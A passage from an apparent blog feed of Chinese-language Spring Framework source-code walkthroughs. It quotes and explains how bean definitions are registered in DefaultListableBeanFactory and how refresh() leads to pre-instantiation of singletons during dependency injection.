punctuation">.</span><span class="token function">setEnforceInitMethod</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 解析destory-method属性</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">hasAttribute</span><span class="token punctuation">(</span>DESTROY_METHOD_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String destroyMethodName <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>DESTROY_METHOD_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">;</span>            bd<span class="token punctuation">.</span><span class="token function">setDestroyMethodName</span><span class="token punctuation">(</span>destroyMethodName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>defaults<span class="token punctuation">.</span><span class="token function">getDestroyMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            bd<span class="token punctuation">.</span><span class="token function">setDestroyMethodName</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>defaults<span class="token punctuation">.</span><span class="token function">getDestroyMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bd<span class="token punctuation">.</span><span class="token function">setEnforceDestroyMethod</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">hasAttribute</span><span class="token punctuation">(</span>FACTORY_METHOD_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            bd<span class="token punctuation">.</span><span class="token function">setFactoryMethodName</span><span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>FACTORY_METHOD_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">hasAttribute</span><span class="token punctuation">(</span>FACTORY_BEAN_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            bd<span class="token punctuation">.</span><span class="token function">setFactoryBeanName</span><span class="token punctuation">(</span>ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>FACTORY_BEAN_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> bd<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>ok，我们现在来说BeanDefinition在IoC容器中的注册，先回到DefaultBeanDefinitionDocumentReader类中的<code>processBeanDefinition</code>方法</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Process the given bean element, parsing the bean definition     * and registering it with the registry.     */</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">processBeanDefinition</span><span class="token punctuation">(</span>Element ele<span class="token punctuation">,</span> BeanDefinitionParserDelegate delegate<span class="token punctuation">)</span> <span class="token punctuation">{</span>        BeanDefinitionHolder bdHolder <span class="token operator">=</span> delegate<span class="token punctuation">.</span><span class="token function">parseBeanDefinitionElement</span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>bdHolder <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            bdHolder <span class="token operator">=</span> delegate<span class="token punctuation">.</span><span class="token function">decorateBeanDefinitionIfRequired</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> bdHolder<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Register the final decorated instance.</span>                <span class="token comment" spellcheck="true">// 重点代码</span>                BeanDefinitionReaderUtils<span class="token punctuation">.</span><span class="token function">registerBeanDefinition</span><span class="token punctuation">(</span>bdHolder<span class="token punctuation">,</span> <span class="token function">getReaderContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeanDefinitionStoreException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">getReaderContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Failed to register bean definition with name '"</span> <span class="token operator">+</span>                        bdHolder<span class="token punctuation">.</span><span class="token function">getBeanName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">,</span> ele<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// Send registration event.</span>            <span class="token function">getReaderContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fireComponentRegistered</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BeanComponentDefinition</span><span class="token punctuation">(</span>bdHolder<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Register the given bean definition with the given bean factory.     * @param definitionHolder the bean definition including name and aliases     * @param registry the bean factory to register with     * @throws BeanDefinitionStoreException if registration failed     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">registerBeanDefinition</span><span class="token punctuation">(</span>            BeanDefinitionHolder definitionHolder<span class="token punctuation">,</span> BeanDefinitionRegistry registry<span class="token punctuation">)</span>            <span class="token keyword">throws</span> BeanDefinitionStoreException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Register bean definition under primary name.</span>        String beanName <span class="token operator">=</span> definitionHolder<span class="token punctuation">.</span><span class="token function">getBeanName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 重点方法，它是由DefaultListableBeanFactory去具体实现的</span>        registry<span class="token punctuation">.</span><span class="token function">registerBeanDefinition</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> definitionHolder<span class="token punctuation">.</span><span class="token function">getBeanDefinition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Register aliases for bean name, if any.</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> aliases <span class="token operator">=</span> definitionHolder<span class="token punctuation">.</span><span class="token function">getAliases</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>aliases <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>String alias <span class="token operator">:</span> aliases<span class="token punctuation">)</span> <span class="token punctuation">{</span>                registry<span class="token punctuation">.</span><span class="token function">registerAlias</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> alias<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>DefaultListableBeanFactory里的registerBeanDefinition</p><pre><code>//---------------------------------------------------------------------// Implementation of BeanDefinitionRegistry interface//---------------------------------------------------------------------@Overridepublic void registerBeanDefinition(String beanName, BeanDefinition beanDefinition)      throws BeanDefinitionStoreException {   Assert.hasText(beanName, &quot;Bean name must not be empty&quot;);   Assert.notNull(beanDefinition, &quot;BeanDefinition must not be null&quot;);   if (beanDefinition instanceof AbstractBeanDefinition) {      try {         ((AbstractBeanDefinition) beanDefinition).validate();      }      catch (BeanDefinitionValidationException ex) {         throw new BeanDefinitionStoreException(beanDefinition.getResourceDescription(), beanName,               &quot;Validation of bean definition failed&quot;, ex);      }   }   BeanDefinition existingDefinition = this.beanDefinitionMap.get(beanName);   if (existingDefinition != null) {      if (!isAllowBeanDefinitionOverriding()) {         throw new BeanDefinitionOverrideException(beanName, beanDefinition, existingDefinition);      }      else if (existingDefinition.getRole() &lt; beanDefinition.getRole()) {         // e.g. was ROLE_APPLICATION, now overriding with ROLE_SUPPORT or ROLE_INFRASTRUCTURE         if (logger.isInfoEnabled()) {            logger.info(&quot;Overriding user-defined bean definition for bean &#39;&quot; + beanName +                  &quot;&#39; with a framework-generated bean definition: replacing [&quot; +                  existingDefinition + &quot;] with [&quot; + beanDefinition + &quot;]&quot;);         }      }      else if (!beanDefinition.equals(existingDefinition)) {         if (logger.isDebugEnabled()) {            logger.debug(&quot;Overriding bean definition for bean &#39;&quot; + beanName +                  &quot;&#39; with a different definition: replacing [&quot; + existingDefinition +                  &quot;] with [&quot; + beanDefinition + &quot;]&quot;);         }      }      else {         if (logger.isTraceEnabled()) {            logger.trace(&quot;Overriding bean definition for bean &#39;&quot; + beanName +                  &quot;&#39; with an equivalent definition: replacing [&quot; + existingDefinition +                  &quot;] with [&quot; + beanDefinition + &quot;]&quot;);         }      }      this.beanDefinitionMap.put(beanName, beanDefinition);   }   else {      if (hasBeanCreationStarted()) {         // Cannot modify startup-time collection elements anymore (for stable iteration)         synchronized (this.beanDefinitionMap) {            this.beanDefinitionMap.put(beanName, beanDefinition);            List&lt;String&gt; updatedDefinitions = new ArrayList&lt;&gt;(this.beanDefinitionNames.size() + 1);            updatedDefinitions.addAll(this.beanDefinitionNames);            updatedDefinitions.add(beanName);            this.beanDefinitionNames = updatedDefinitions;            removeManualSingletonName(beanName);         }      }      else {         // Still in startup registration phase         this.beanDefinitionMap.put(beanName, beanDefinition);         this.beanDefinitionNames.add(beanName);         removeManualSingletonName(beanName);      }      this.frozenBeanDefinitionNames = null;   }   if (existingDefinition != null || containsSingleton(beanName)) {           // 重置所有beanName对应的缓存      resetBeanDefinition(beanName);   }}</code></pre><p>最后我们在上面这个方法中对beanDefinitionMap（HashMap）注册BeanDefinition。</p><p><strong>我们下一篇文章在接着续上依赖注入的过程</strong></p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
          <category> Spring源码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> Spring源码 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringIOC之DI过程源码剖析</title>
      <link href="/2020/05/24/springioc-zhi-di-guo-cheng-yuan-ma-pou-xi/"/>
      <url>/2020/05/24/springioc-zhi-di-guo-cheng-yuan-ma-pou-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="一、本章重点"><a href="#一、本章重点" class="headerlink" title="一、本章重点"></a>一、本章重点</h2><h3 id="1、对象预初始化"><a href="#1、对象预初始化" class="headerlink" title="1、对象预初始化"></a>1、对象预初始化</h3><ul><li><strong>Spring提供的两种容器类型，ApplicationContext和BeanFactory</strong></li></ul><blockquote><p>两者都是用来从容器中获取spring beans的，不同之处在于BeanFactory使用的是懒加载，也就是在我们通过getBean()调用它们时才会进行实例化，而ApplicationContext继承自BeanFactory，与前者不同的在于ApplicationContext在启动时就将所有beans全部实例化了</p><p>所以我们在文本中将会介绍一下对象的预初始化</p></blockquote><h3 id="2、FactoryBean详解"><a href="#2、FactoryBean详解" class="headerlink" title="2、FactoryBean详解"></a>2、FactoryBean详解</h3><ul><li><p>BeanFactory就是生产FactoryBean的工厂</p></li><li><p>FactoryBean是一个能够生成对象的工厂的Bean，它是创建Bean的一种方式，FactoryBean在Spring中是带“&amp;”的</p></li></ul><h3 id="3、GetBean详解"><a href="#3、GetBean详解" class="headerlink" title="3、GetBean详解"></a>3、GetBean详解</h3><p>GetBean是获得创建好对象的方法</p><h3 id="4、对象初始化过程"><a href="#4、对象初始化过程" class="headerlink" title="4、对象初始化过程"></a>4、对象初始化过程</h3><ul><li>单例对象</li><li>原型对象</li><li>init-method</li></ul><h3 id="5、BeanProcessProcessor"><a href="#5、BeanProcessProcessor" class="headerlink" title="5、BeanProcessProcessor"></a>5、BeanProcessProcessor</h3><p>bean对象处理器</p><h2 id="二、DI过程"><a href="#二、DI过程" class="headerlink" title="二、DI过程"></a>二、DI过程</h2><p><img src="https://upload-images.jianshu.io/upload_images/21601015-e0e294e350151464.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="SpringDi过程.png"></p><ol><li>创建Bean的Class：通过class反射拿到Object，Bean的class是从XML中读取成为BeanDefinition之后，注册到BeanDefinitionRegistry，也就是注册器中，就是DefaultListableBeanFactory里的registerBeanDefinition</li><li>调用BeanPostProcessor：具体对象的后置处理器</li></ol><h3 id="1、对象初始化"><a href="#1、对象初始化" class="headerlink" title="1、对象初始化"></a>1、对象初始化</h3><p>老样子，我们还是从ClassPathXmlApplicationContext的refresh()方法开始看</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 主入口 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApplicationContextMain</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ApplicationContext context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>ClassPathXmlApplicationContext的构造方法，从给定的XML文件中自动刷新上下文，这个构造很直白，继续追踪</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * Create a new ClassPathXmlApplicationContext, loading the definitions * from the given XML file and automatically refreshing the context. * @param configLocation resource location * @throws BeansException if context creation failed */</span><span class="token keyword">public</span> <span class="token function">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span>String configLocation<span class="token punctuation">)</span> <span class="token keyword">throws</span> BeansException <span class="token punctuation">{</span>   <span class="token keyword">this</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>configLocation<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Create a new ClassPathXmlApplicationContext with the given parent,     * loading the definitions from the given XML files.     * @param configLocations array of resource locations     * @param refresh whether to automatically refresh the context,     * loading all bean definitions and creating all singletons.     * Alternatively, call refresh manually after further configuring the context.     * @param parent the parent context     * @throws BeansException if context creation failed     * @see #refresh()     */</span>    <span class="token keyword">public</span> <span class="token function">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> configLocations<span class="token punctuation">,</span> <span class="token keyword">boolean</span> refresh<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> ApplicationContext parent<span class="token punctuation">)</span>            <span class="token keyword">throws</span> BeansException <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 定义配置文件数组 String[] configLocations</span>        <span class="token function">setConfigLocations</span><span class="token punctuation">(</span>configLocations<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>refresh<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 载入BeanDefinition的入口</span>            <span class="token function">refresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>下面是<code>refresh()</code>方法，核心、重点，重点，重点</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">refresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> BeansException<span class="token punctuation">,</span> IllegalStateException <span class="token punctuation">{</span>        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>startupShutdownMonitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Prepare this context for refreshing.</span>            <span class="token comment" spellcheck="true">// 1.准备刷新上下文环境，主要是一些状态的准备</span>            <span class="token function">prepareRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Tell the subclass to refresh the internal bean factory.</span>            <span class="token comment" spellcheck="true">// 2.驱动子类进行工厂的刷新，主要是进行BeanFactory的初始化 -- 重点</span>            ConfigurableListableBeanFactory beanFactory <span class="token operator">=</span> <span class="token function">obtainFreshBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Prepare the bean factory for use in this context.</span>            <span class="token comment" spellcheck="true">// 3.准备BeanFactory所需条件及进行功能填充 -- 重点</span>            <span class="token function">prepareBeanFactory</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Allows post-processing of the bean factory in context subclasses.</span>                <span class="token comment" spellcheck="true">// 4.允许在上下文子类中对bean工厂进行后置处理，即在子类中添加后置处理功能 -- 重点</span>                <span class="token function">postProcessBeanFactory</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Invoke factory processors registered as beans in the context.</span>                <span class="token comment" spellcheck="true">// 5.在上下文中调用注册为bean的工厂处理器 -- 重点</span>                <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Register bean processors that intercept bean creation.</span>                <span class="token comment" spellcheck="true">// 6.注册“拦截bean”创建的bean后置处理器（仅注册，getBean时调用） -- 重点</span>                <span class="token function">registerBeanPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Initialize message source for this context.</span>                <span class="token comment" spellcheck="true">// 7.初始化消息资源，国际化</span>                <span class="token function">initMessageSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Initialize event multicaster for this context.</span>                <span class="token comment" spellcheck="true">// 8.初始化上下文中的事件广播器</span>                <span class="token function">initApplicationEventMulticaster</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Initialize other special beans in specific context subclasses.</span>                <span class="token comment" spellcheck="true">// 9.初始化特定上下文子类中的其他特殊bean，支持自定义功能增强</span>                <span class="token function">onRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Check for listener beans and register them.</span>                <span class="token comment" spellcheck="true">// 10.在已注册的bean中查找监听Bean，并注册到事件广播器中</span>                <span class="token function">registerListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Instantiate all remaining (non-lazy-init) singletons.</span>                <span class="token comment" spellcheck="true">// 11.实例化所有剩余的（非延迟初始化）单例 -- 重点</span>                <span class="token function">finishBeanFactoryInitialization</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Last step: publish corresponding event.</span>                <span class="token comment" spellcheck="true">// 12.发布相应事件进行通知，刷新方法整体结束</span>                <span class="token function">finishRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>省略</code></pre><p>refresh()中的<code>finishBeanFactoryInitialization()</code>初始化非懒加载的对象</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractApplicationContext</span> <span class="token keyword">extends</span> <span class="token class-name">DefaultResourceLoader</span>        <span class="token keyword">implements</span> <span class="token class-name">ConfigurableApplicationContext</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * Finish the initialization of this context's bean factory,     * initializing all remaining singleton beans.     */</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">finishBeanFactoryInitialization</span><span class="token punctuation">(</span>ConfigurableListableBeanFactory beanFactory<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Initialize conversion service for this context.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">containsBean</span><span class="token punctuation">(</span>CONVERSION_SERVICE_BEAN_NAME<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                beanFactory<span class="token punctuation">.</span><span class="token function">isTypeMatch</span><span class="token punctuation">(</span>CONVERSION_SERVICE_BEAN_NAME<span class="token punctuation">,</span> ConversionService<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            beanFactory<span class="token punctuation">.</span><span class="token function">setConversionService</span><span class="token punctuation">(</span>                    beanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>CONVERSION_SERVICE_BEAN_NAME<span class="token punctuation">,</span> ConversionService<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Register a default embedded value resolver if no bean post-processor</span>        <span class="token comment" spellcheck="true">// (such as a PropertyPlaceholderConfigurer bean) registered any before:</span>        <span class="token comment" spellcheck="true">// at this point, primarily for resolution in annotation attribute values.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>beanFactory<span class="token punctuation">.</span><span class="token function">hasEmbeddedValueResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            beanFactory<span class="token punctuation">.</span><span class="token function">addEmbeddedValueResolver</span><span class="token punctuation">(</span>strVal <span class="token operator">-</span><span class="token operator">></span> <span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">resolvePlaceholders</span><span class="token punctuation">(</span>strVal<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Initialize LoadTimeWeaverAware beans early to allow for registering their transformers early.</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> weaverAwareNames <span class="token operator">=</span> beanFactory<span class="token punctuation">.</span><span class="token function">getBeanNamesForType</span><span class="token punctuation">(</span>LoadTimeWeaverAware<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>String weaverAwareName <span class="token operator">:</span> weaverAwareNames<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">getBean</span><span class="token punctuation">(</span>weaverAwareName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Stop using the temporary ClassLoader for type matching.</span>        beanFactory<span class="token punctuation">.</span><span class="token function">setTempClassLoader</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Allow for caching all bean definition metadata, not expecting further changes.</span>        beanFactory<span class="token punctuation">.</span><span class="token function">freezeConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Instantiate all remaining (non-lazy-init) singletons.</span>        <span class="token comment" spellcheck="true">// 初始化所有剩余的单例</span>        beanFactory<span class="token punctuation">.</span><span class="token function">preInstantiateSingletons</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>其它的我们先不用关注，重点看<code>beanFactory.preInstantiateSingletons();</code>（初始化所有剩余的单例），它是由<code>DefaultListableBeanFactory</code>类实现的</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DefaultListableBeanFactory</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractAutowireCapableBeanFactory</span>        <span class="token keyword">implements</span> <span class="token class-name">ConfigurableListableBeanFactory</span><span class="token punctuation">,</span> BeanDefinitionRegistry<span class="token punctuation">,</span> Serializable <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">preInstantiateSingletons</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> BeansException <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Pre-instantiating singletons in "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Iterate over a copy to allow for init methods which in turn register new bean definitions.</span>        <span class="token comment" spellcheck="true">// While this may not be part of the regular factory bootstrap, it does otherwise work fine.</span>        List<span class="token operator">&lt;</span>String<span class="token operator">></span> beanNames <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>beanDefinitionNames<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Trigger initialization of all non-lazy singleton beans...</span>        <span class="token comment" spellcheck="true">// 触发加载所有非懒加载的单例bean</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>String beanName <span class="token operator">:</span> beanNames<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 获得BeanDefinition</span>            RootBeanDefinition bd <span class="token operator">=</span> <span class="token function">getMergedLocalBeanDefinition</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 判断当前的BeanDefinition是：非抽象类，是单例的，并且是非懒加载的</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bd<span class="token punctuation">.</span><span class="token function">isAbstract</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> bd<span class="token punctuation">.</span><span class="token function">isSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>bd<span class="token punctuation">.</span><span class="token function">isLazyInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 判断是FactoryBean</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isFactoryBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// FACTORY_BEAN_PREFIX = &amp;；也就是</span>                    Object bean <span class="token operator">=</span> <span class="token function">getBean</span><span class="token punctuation">(</span>FACTORY_BEAN_PREFIX <span class="token operator">+</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">FactoryBean</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">final</span> FactoryBean<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> factory <span class="token operator">=</span> <span class="token punctuation">(</span>FactoryBean<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">)</span> bean<span class="token punctuation">;</span>                        <span class="token keyword">boolean</span> isEagerInit<span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token 